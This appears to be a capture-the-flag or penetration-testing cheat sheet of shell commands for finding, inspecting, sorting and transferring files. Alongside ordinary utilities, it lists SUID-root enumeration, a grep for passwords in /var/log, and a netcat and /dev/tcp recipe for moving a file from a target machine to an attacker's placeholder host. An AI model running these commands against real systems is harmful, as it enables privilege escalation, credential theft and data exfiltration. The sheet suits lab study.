# Files
## File Type
### Print the file type of all files in a folder:
```bash
file */{.,}*
```		
## Filtering Files
### Name
```bash
find / -name "<name>" 2>/dev/null
```
#### Ex. Flags
```bash
find / -name "*flag*" 2>/dev/null
```
### Owned by Root w/ the SUID Bit Set
```bash
find / -perm -4000 -user root -type f 2>/dev/null
```
```bash
find / -perm -u=s -type f 2>/dev/null
```
### Group
```bash
find / -group <GROUP> 2>/dev/null
```
### Finding the string password in log files
```bash
grep -R -e 'password' /var/log/ 2>/dev/null
```
### ASCII Text
```bash
file */{.,}* | grep ASCII
```
### Size
```bash
du -b -a | grep 1033
```
### Non-Executable
```bash
find . ! -executable
```
### ASCII Text, Size, and Non-Executable
```bash
find . -type f -size 1033c ! -executable -exec file '{}' \; | grep ASCII
```
- -size 1033 to look for the file-size requirement.
- -type f to only look at files.
- -exec file '{}' \;, to execute the file command and get the file data type. After that, we simply need to filter the output for the file type ‘ASCII’ again.  

## Searching in a File
### Unique Lines: 
```bash
sort <file> |  uniq -u
```
- To filter by unique lines the lines need to be sorted
### Duplicate Lines
```bash
uniq -d
```
### Count Lines:
```bash
uniq -c
```
## Sorting a File
```bash
sort <file>
```
### In Reverse 
```bash
sort -r <file>
```
### Numerically
```bash
sort -n <file>
```
Sort: sort <file>
Sort (in reverse): sort -r <file>
Sort (numerically): sort -n <file>
## Serving a File
### Python Method
Creating the File Server:
```bash
sudo python -m http.server 80
```
Downloading the File:
```bash
wget http://IP_ADDRESS:80/FILE
```
```bash
curl http://IP_ADDRESS:80/filename -o filename
```
### Netcat Method
Attacking Machine:
```bash
nc -lvnp PORT > FILE
```
Target Machine:
```bash
cat FILE > /dev/tcp/IP_ADDRESS/PORT
```
